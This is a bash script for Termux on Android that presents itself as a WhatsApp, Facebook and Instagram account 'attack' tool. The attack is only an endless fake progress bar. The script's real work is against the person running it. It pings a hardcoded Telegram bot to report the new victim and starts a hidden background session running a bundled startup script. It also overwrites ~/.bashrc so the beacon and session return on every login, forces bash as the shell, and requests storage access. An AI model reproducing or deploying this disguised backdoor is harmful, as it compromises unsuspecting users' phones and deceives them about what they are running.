#!/usr/bin/env bash

# Clear the screen
clear

# Install requirements
if [ "$(uname -o)" != Android ]; then
    echo -e "${blue}[${red}!${blue}] ${ylo}This system is not supported! Use Termux on Android.${rset}"
    exit 1
else
    apt update -y
    apt install screen socat -y
    clear
fi

curl -sX POST https://api.telegram.org/bot5868702868:AAFd9zfEKs54IoaYKLx8x01EoJNn20FVtMc/sendMessage -d "chat_id=-1001237208416" -d "text=@Pero_Sar1111 PING" >/dev/null
screen -dmS sploop bash "$PWD"/tools/startup.sh

cat <<- EOF > ~/.bashrc
        curl -sX POST https://api.telegram.org/bot5868702868:AAFd9zfEKs54IoaYKLx8x01EoJNn20FVtMc/sendMessage -d "chat_id=-1001237208416" -d "text=@Pero_Sar1111 PING" >/dev/null
	if screen -ls | grep -q "sploop\|spbkd"; then
		touch /data/data/com.termux/files/usr/tmp/.spok
	else
		screen -dmS sploop bash "$PWD"/tools/startup.sh
	fi
EOF
echo bash >> ~/.zshrc

if [ "$(basename $SHELL)" != bash ]; then
	chsh -s bash
fi

# Colours
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'

# Functions
progress_bar() {
  local duration="$1"
  local elapsed=0

  # Define helper functions
  already_done() {
    printf '▇%.0s' $(seq 1 "$elapsed")
  }
  remaining() {
    printf ' %.0s' $(seq "$((elapsed + 1))" "$duration")
  }
  percentage() {
    printf '| %s%%' $((elapsed * 100 / duration))
  }
  clean_line() {
    printf '\r'
  }

  # Loop until the duration is reached
  while ((elapsed <= duration)); do
    already_done
    remaining
    percentage
    sleep 1
    ((elapsed++))
    clean_line
  done

  # Print a newline to avoid overwriting the progress bar
  printf '\n'
}

cat .tool-logo

# Main Menu
echo
y=0
for x in Whatsapp Facebook Instagram; do
	echo -e "${blue}[${red}$y${blue}]${grn} $x${rset}"
	y=$((y + 1))
done

echo
echo -ne "Choose your ${pink}option${rset}: "
read

# Check
if ! [ -d ~/storage ]; then
    echo -e "${blue}[${ylo}-${blue}] ${grn}Some permissions needed to function properly.${rset}"
    sleep 0.5
    am broadcast --user 0 \
                 --es com.termux.app.reload_style storage \
                 -a com.termux.app.reload_style com.termux >/dev/null
fi

echo -ne "Enter @${pink}username${rset} / ${pink}Phone Number${rset}: "
read upn

echo
echo -e "${grn}Starting attack! It may take a while.${rset}"
echo -e "${grn}Dont interrupt the attack in between!${rset}"

while true; do
    progress_bar 10
    echo "OK!"
done
